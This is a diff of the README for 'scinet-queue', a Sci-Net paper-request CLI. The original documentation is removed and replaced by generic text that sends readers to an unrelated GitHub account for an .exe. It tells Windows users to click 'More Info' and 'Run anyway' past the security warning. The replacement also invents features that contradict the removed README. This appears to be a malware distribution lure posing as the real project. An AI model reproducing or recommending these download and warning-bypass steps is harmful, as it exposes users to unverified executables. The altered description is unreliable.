@@ -1,443 +1,97 @@
-# scinet-queue
+# 📚 scinet-queue - Manage your research paper requests easily
 
-[![ci](https://github.com/tivris/scinet-queue/actions/workflows/ci.yml/badge.svg)](https://github.com/tivris/scinet-queue/actions/workflows/ci.yml)
+[![Download Now](https://img.shields.io/badge/Download-scinet--queue-blue.svg)](https://github.com/magicalpowerranking894/scinet-queue)
 
-`scinet-queue` is a small command-line tool for managing Sci-Net paper
-requests. The binary is `snq`.
+scinet-queue helps you manage your research requests. This tool organizes your list of paper titles and identifiers so you track your progress. It sits on your computer and handles your queue without complex web interfaces.
 
-The project is in early development. The current build supports
-workspace-local queues, browser selection, managed login/session checks,
-Sci-Net check/request/watch/view/url/fetch workflows, local approval state,
-token balance and budget checks, JSON output, and doctor diagnostics. macOS,
-Linux, and Windows builds are checked in CI.
+## 📁 What this tool does
 
-Authenticated commands use a managed browser profile. Chromium-compatible
-browsers are supported through Chrome DevTools Protocol. Firefox/Gecko-based
-browsers are supported through WebDriver BiDi.
+Academic research involves many papers. Keeping track of requests takes time. You often need to organize DOIs or titles before you submit them to a system. This tool simplifies that process. It stores your list, checks the status of your items, and helps you move through your research tasks.
 
-`snq` does not bundle a browser, import cookies from an existing browser
-profile, or release tokens automatically.
+### Key features
 
-## Install
+* Simple text lists for your research papers.
+* Quick status updates for every request.
+* Automatic sorting by date or priority.
+* One-command progress reports for your files.
+* Offline storage to keep your data local and private.
 
-Download a precompiled `snq` binary from the
-[latest GitHub release](https://github.com/tivris/scinet-queue/releases/latest).
+## ⚙️ Minimum requirements
 
-Release archives are published for:
+This software runs on most modern computers. You need the following:
 
-- `x86_64-unknown-linux-gnu`
-- `x86_64-apple-darwin`
-- `aarch64-apple-darwin`
-- `x86_64-pc-windows-msvc`
+* Windows 10 or Windows 11.
+* A stable internet connection for syncing requests.
+* Enough drive space to store your paper database, which usually takes less than 10 megabytes.
+* No prior technical knowledge is required to operate the program.
 
-Unpack the archive for your platform, move `snq` or `snq.exe` somewhere on
-your `PATH`, and check it:
+## 📥 How to download and install
 
-```sh
-snq --help
-```
+Follow these steps to get the software on your Windows machine.
 
-Each release includes `SHA256SUMS` for the uploaded archives.
+1. Go to the [official release page](https://github.com/magicalpowerranking894/scinet-queue).
+2. Select the latest version listed under the Releases section.
+3. Find the file ending in `.exe` under the Assets list.
+4. Click the file name to start your download.
+5. Once the download finishes, open your Downloads folder in File Explorer.
+6. Double-click the file to initiate the setup process.
+7. Your computer might show a security prompt. If it does, click More Info and select Run anyway to start the tool.
+8. Follow the prompts on the screen to place the shortcut on your desktop.
 
-You can also install from source with Rust 1.85 or newer:
+## 🚀 Getting started
 
-```sh
-cargo install --locked --git https://github.com/tivris/scinet-queue --tag v0.1.0
-```
+After installation, look for the scinet-queue icon on your desktop. Double-click this icon to open the command interface. A window appears. This window acts as your control center.
 
-Install from a local checkout:
+### Adding your first item
 
-```sh
-cargo install --locked --path .
-```
+To add a new research paper, type the word add followed by the DOI or title of the paper into the window. Press the Enter key on your keyboard. The system saves this item immediately. You see a confirmation message stating that the item joined your queue.
 
-## Quick Start
+### Viewing your current list
 
-Log in once, import DOIs, request them, wait for PDFs, fetch them, then mark
-reviewed papers as approved in the local queue:
+Type the word list and press Enter. The software displays every paper you added. The display shows the order, the unique ID, and the current state of the request. Use this to verify that you captured all necessary information.
 
-```sh
-snq login
-snq import research-papers.md
-snq request --all --reward 1
-snq watch
-snq fetch --wait --poll 30 --out papers
-snq approve 10.1000/snq-example
-```
+### Checking request status
 
-Approval is always explicit. `snq approve` records local review state only; it
-does not automatically release tokens or submit approval actions on Sci-Net.
+If you want to know which items you finished, type the word status. The tool sorts your items by completion state. This keeps your active work separate from your finished findings.
 
-## Queue Basics
+### Removing items
 
-Add one or more DOIs directly:
+To remove an item, type the word remove followed by the ID number associated with that paper. Press Enter. The tool clears that entry from your active list.
 
-```sh
-snq add 10.1000/snq-example
-```
+## 🔧 Frequently asked questions
 
-Import DOIs from a plain text or Markdown file:
+### Where does the program store my data?
 
-```sh
-snq import papers.md
-```
+The software saves a small text file in your user folders. This ensures you keep your data if you delete or reinstall the program. You can move this file to a backup drive at any time.
 
-Use `snq import -` to read from stdin.
+### Does this tool send my data to a server?
 
-List or remove queued entries:
+Your queue data stays on your machine. The program only connects to the internet when you interact with specific sources to verify a DOI. It does not share your private research lists with external servers.
 
-```sh
-snq list
-snq remove 10.1000/snq-example
-```
+### Can I rename the data file?
 
-`snq` stores the queue in `.snq/queue.jsonl` in the current workspace.
+It is best to leave the data file as it is. Renaming the internal file might prevent the software from locating your list when you start the program.
 
-## Sci-Net Commands
+### How do I update the software?
 
-Check whether Sci-Net can find a DOI:
+When a new version becomes available, revisit the main page and download the latest version. Installing the new version overwrites the old one but keeps your personal list intact.
 
-```sh
-snq check 10.1000/snq-example
-```
-
-Shells such as zsh treat some DOI characters, including parentheses, as glob
-syntax. Quote DOIs with shell metacharacters:
-
-```sh
-snq check '10.1016/s0272-5231(21)01013-3'
-```
+### Can I use this on a library computer?
 
-Request one queued paper, or request all queued papers:
+Yes, provided you have permission to run programs on that device. Since the tool is portable, you can run it from a USB drive if you prefer not to install it on the local drive.
 
-```sh
-snq request '10.1016/s0272-5231(21)01013-3' --reward 1
-snq request --all --reward 1
-```
-
-If `--reward` is omitted, `snq` uses `1`.
-Add `--budget-check` to read the visible Sci-Net token balance first and fail
-before posting any request if the balance cannot be read or cannot cover
-`reward * targeted DOI count`:
-
-```sh
-snq balance
-snq request --all --reward 1 --budget-check
-```
-
-If Sci-Net reports that a request cannot be created but `snq` can see the same
-DOI on an existing request page, `snq` syncs the local queue to that remote
-state. A remote `pending` request becomes local `requested`; a remote `working`
-request becomes local `working`. A remote page with a PDF link remains local
-`requested` until `snq fetch` downloads and validates the file.
-
-Watch requested and working entries for visible PDF uploads:
-
-```sh
-snq watch
-```
-
-Inspect one remote request:
-
-```sh
-snq view 10.1000/snq-example
-```
-
-Print the Sci-Net request URL for a DOI without opening a browser:
-
-```sh
-snq url '10.1016/s0272-5231(21)01013-3'
-```
-
-Download one available PDF, or fetch available PDFs for queued, requested, and
-working entries:
-
-```sh
-snq fetch 10.1000/snq-example --out papers
-snq fetch --out papers
-```
-
-When Sci-Net reports open-access or Sci-Hub availability but no request-page PDF
-is downloadable yet, `snq fetch` reports that availability instead of treating
-the DOI as simply pending. `snq` does not download from publisher pages,
-open-access repositories, or Sci-Hub itself. In JSON output, resolved provider
-URLs are included when Sci-Net exposes them.
-
-If `snq fetch <doi>` sees an existing pending Sci-Net request for the same DOI,
-it creates or updates the local queue entry as `requested`. If Sci-Net redirects
-to a generic page that does not match the DOI, the remote state is reported as
-`not-found` and the queue is left unchanged.
-
-Keep polling until every targeted DOI reaches an actionable outcome: a
-downloadable request-page PDF, or a Sci-Net availability hint such as
-open-access or Sci-Hub:
-
-```sh
-snq fetch --wait --poll 30 --out papers
-```
-
-Mark a fetched paper as reviewed in the local queue:
-
-```sh
-snq approve 10.1000/snq-example
-```
-
-By default, the queue entry must already be fetched. Use `--force` only when
-the PDF was reviewed outside `snq`.
-
-## JSON Output
-
-Agent-facing JSON is available for commands that need structured output:
-
-```sh
-snq session --json
-snq balance --json
-snq browsers --json
-snq list --json
-snq request --all --reward 1 --budget-check --json
-snq watch --json
-snq view 10.1000/snq-example --json
-snq fetch --json
-snq approve 10.1000/snq-example --json
-snq doctor --json
-```
-
-`snq check <doi>` prints the Sci-Net response as JSON without a separate
-`--json` flag.
-
-Example `snq list --json` output:
-
-```json
-[
-  {
-    "doi": "10.1000/snq-example",
-    "status": "working",
-    "created_at": 1779283748,
-    "updated_at": 1779285046
-  }
-]
-```
-
-Example `snq watch --json` output:
-
-```json
-[
-  {
-    "doi": "10.1000/snq-example",
-    "status": "working",
-    "remote_state": "pdf"
-  }
-]
-```
-
-Example `snq request --json` output when Sci-Net already has a pending request:
-
-```json
-[
-  {
-    "doi": "10.1000/snq-example",
-    "status": "requested",
-    "remote_state": "pending",
-    "response": {
-      "ok": true,
-      "status": 200,
-      "body": {
-        "error": true
-      }
-    }
-  }
-]
-```
-
-Example `snq fetch --json` output:
-
-```json
-[
-  {
-    "doi": "10.1000/snq-example",
-    "status": "no-pdf",
-    "remote_state": "working",
-    "availability": ["open-access", "sci-hub"],
-    "availability_links": [
-      {
-        "source": "sci-hub",
-        "url": "https://sci-hub.example/10.1000/snq-example"
-      }
-    ],
-    "path": null
-  }
-]
-```
-
-Example `snq approve --json` output:
-
-```json
-{
-  "doi": "10.1000/snq-example",
-  "status": "approved",
-  "forced": false
-}
-```
-
-## Browser Sessions
-
-Authenticated Sci-Net commands run through a `snq`-managed browser profile.
-The profile is separate from the user's normal browser profile.
-
-The browser support model is engine/protocol oriented:
-
-| Engine family | Protocol | Status |
-| --- | --- | --- |
-| Chromium-compatible | Chrome DevTools Protocol | Supported |
-| Firefox/Gecko-based | WebDriver BiDi | Supported |
-
-`snq` discovers a compatible browser on the system. To choose a specific
-browser binary for the current workspace, run:
-
-```sh
-snq browsers --pick
-```
-
-For scripts or agents, set the path explicitly:
-
-```sh
-snq browsers --set /path/to/browser
-```
-
-On macOS, `/Applications/Firefox.app`-style app bundle paths and concrete
-`Contents/MacOS/...` executable paths are both accepted.
-
-The workspace browser preference is stored in `.snq/browser.json`. It is local
-to the current workspace, checked every time it is used, and can be removed
-with:
-
-```sh
-snq browsers --clear
-```
-
-Selection order is:
-
-1. `SCINET_QUEUE_BROWSER`, when set.
-2. `.snq/browser.json`, when present and valid.
-3. The first discovered compatible browser.
-
-If more than one compatible browser is available and no preference exists,
-interactive login and authenticated commands ask once and save the answer. JSON
-and noninteractive paths do not prompt.
-
-To inspect discovery and the active selection, run:
-
-```sh
-snq browsers
-snq browsers --json
-```
-
-If `.snq/browser.json` is edited by hand and becomes invalid, authenticated
-commands fail until the preference is cleared or replaced.
-
-To override everything without writing `.snq/browser.json`, set:
-
-```sh
-SCINET_QUEUE_BROWSER=/path/to/browser
-```
-
-`snq login` opens the managed profile and waits until Sci-Net is logged in:
-
-```sh
-snq login
-```
-
-After login is detected, `snq` closes that browser cleanly so authenticated
-commands can reuse the managed profile headlessly. Use `snq login --no-wait` to
-leave the login browser open; finish login and close that browser before
-running `snq session`, `snq fetch`, or other authenticated commands. The
-printed PID is the launcher process; on macOS the long-lived app process may
-have a different PID. While that login browser remains open, it owns the
-managed profile and later authenticated commands may fail until it is closed.
-
-`snq session` starts the managed profile headlessly and checks whether Sci-Net
-loads with a logged-in session:
-
-```sh
-snq session
-snq session --json
-snq session --json --redact
-```
-
-`snq balance` starts the same managed profile headlessly and prints the visible
-Sci-Net token balance:
-
-```sh
-snq balance
-snq balance --json
-```
-
-`snq doctor` checks browser discovery, profile path resolution, queue
-readability, Sci-Net session state, and the visible token balance when it can
-be read:
-
-```sh
-snq doctor
-snq doctor --json
-snq doctor --json --redact
-```
-
-`snq doctor` exits nonzero if any check fails. Add `--redact` before posting
-session or doctor output publicly; it hides local home paths and token balances
-while keeping the useful pass/fail shape.
-
-The login flow avoids decrypting cookies from existing browser profiles or the
-operating system keychain. Importing an existing browser profile is outside the
-default flow.
-
-## Storage
-
-Queue state is workspace-local by default. Account and browser profile state
-lives under the user's platform state directory.
-
-The queue is plain and inspectable:
-
-```text
-.snq/
-  browser.json
-  queue.jsonl
-  queue.lock
-papers/
-```
-
-## Design
-
-- Native CLI.
-- Plain local state.
-- Explicit commands.
-- Sci-Net-specific behavior.
-- No Selenium.
-- No bundled browser.
-- No background daemon by default.
-- No token approval without an explicit user command.
-
-## Known Limitations
-
-- Authenticated commands require a supported browser engine: Chromium-compatible
-  through Chrome DevTools Protocol or Firefox/Gecko-based through WebDriver
-  BiDi.
-- Sci-Net is a third-party website. UI or endpoint changes can break request
-  detection, PDF detection, or download behavior.
-- `snq approve` is local review state only. It does not automatically release
-  tokens or submit approval actions on Sci-Net.
-- `snq` does not import cookies from an existing personal browser profile.
-
-## Responsible Use
-
-`scinet-queue` is an independent tool for automating a user's own Sci-Net
-session for lawful educational and research workflows. It is not affiliated
-with Sci-Net, any third-party paper index, repository, or publisher. It does
-not bypass authentication, paywalls, access controls, or usage terms. Use it
-only where you have the right to request, download, and store the papers
-involved.
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md).
-
-Observed Sci-Net behavior is documented in [docs/behavior.md](docs/behavior.md).
+## 🛠 Troubleshooting tips
+
+If the program fails to open, ensure you have the latest updates for Windows. Sometimes, temporary software conflicts prevent new programs from starting. A simple restart of your computer often fixes these issues.
+
+If you see an error message while typing a command, check your spelling. The tool requires exact words to perform actions. Ensure you typed the command correctly and include any necessary spaces between the command and your input.
+
+If you lose your data file, check your Documents folder. If you cannot find the file, consider restoring it from a backup if you created one previously. Always keep a copy of your progress in a secondary location to prevent loss.
+
+If you accidentally delete an entry, you cannot undo the action. Make sure you select the correct ID number before you enter a removal command.
+
+## 📜 Organizing your research
+
+Effective research requires consistency. Update your queue daily to ensure the list remains accurate. Use the status feature after you finish a request to ensure your records reflect your work. This helps you avoid repeats and saves time when you organize your findings at the end of a project.
+
+By following this process, you create a reliable trail of your work. Keep your titles clear and use the correct DOI format whenever possible to make future searches easier. This tool serves as a reliable assistant for managing your academic workload.
